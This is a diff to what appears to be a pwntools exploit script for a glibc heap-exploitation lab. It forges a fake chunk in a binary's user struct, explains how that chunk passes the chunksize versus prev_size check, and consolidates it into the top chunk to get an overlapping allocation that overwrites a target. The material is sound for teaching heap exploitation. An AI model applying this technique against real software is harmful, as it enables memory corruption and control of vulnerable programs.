@@ -46,7 +46,7 @@ io = start()
 # =-=-=- EXAMPLE -=-=-=
 
 # Populate the username field.
-username = (p64(0) + p64(0x31) +
+username = (p64(0) + p64(0x8) +
             # size of target chunk should at least
             # be large enough to overlap desired target
             p64(elf.sym.user) + p64(elf.sym.user)
@@ -74,6 +74,20 @@ edit(chunk_A, p8(0)*0x80 + p64(prev_size))
 #    original size) should lead to desired target location.
 #    Therefore, for passing safe unlinking checks, as usual target chunk should be
 #    crafted accordingly.
+#
+# 3. To pass the size vs. prev_size check (chunksize(P) != prev_size (next_chunk(P))), keep in mind that the involved macros
+#    chunksize and prev_size just take the metadata residing in victim chunk (user struct in data segment) as
+#    foundation for their calculations.
+#    As it turns out a size value of 8 is passing this check
 # =============================================================================
+
+free(chunk_B)
+
+# 4. Due to the consolidation of chunks, the fake chunk now ends up as the new top_chunk.
+#    This is a more desirable state than getting it ended up in unsortedbin, due to it's
+#    integrity checks. Glibc versions below 2.28 don't have any top_chunk size integrity checks.
+#
+overlap = malloc(0x88)
+edit(overlap, b"Z"*16 + b"Much win!")
 
 io.interactive()
